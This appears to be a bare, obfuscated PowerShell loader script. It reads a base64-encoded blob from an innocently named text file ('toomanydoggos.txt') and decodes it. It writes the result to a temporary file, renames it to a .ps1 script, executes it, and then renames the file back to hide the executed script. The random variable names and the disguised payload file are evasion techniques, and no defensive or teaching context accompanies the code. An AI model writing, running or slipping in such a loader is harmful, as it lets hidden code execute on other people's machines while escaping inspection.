$gb76tyfghvbjf43 = Get-Content .\toomanydoggos.txt
$43werd5tfgyuh9 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($gb76tyfghvbjf43))
$78yughb3fd2768gf42ch8un = new-temporaryFile
$45rfty8f7y324huyjdqws = $78yughb3fd2768gf42ch8un.FullName
($43werd5tfgyuh9 -Split "@@567y8b@@5678@@") | Out-File $45rfty8f7y324huyjdqws
$87y4v3cf87yb43fvc = ($78yughb3fd2768gf42ch8un.FullName).Split(".")
$7t6fyg42rhc7hgty = ($87y4v3cf87yb43fvc[0] + ".ps1")
rename-item $45rfty8f7y324huyjdqws -newName $7t6fyg42rhc7hgty
&$7t6fyg42rhc7hgty
rename-item -Path $7t6fyg42rhc7hgty -newName $45rfty8f7y324huyjdqws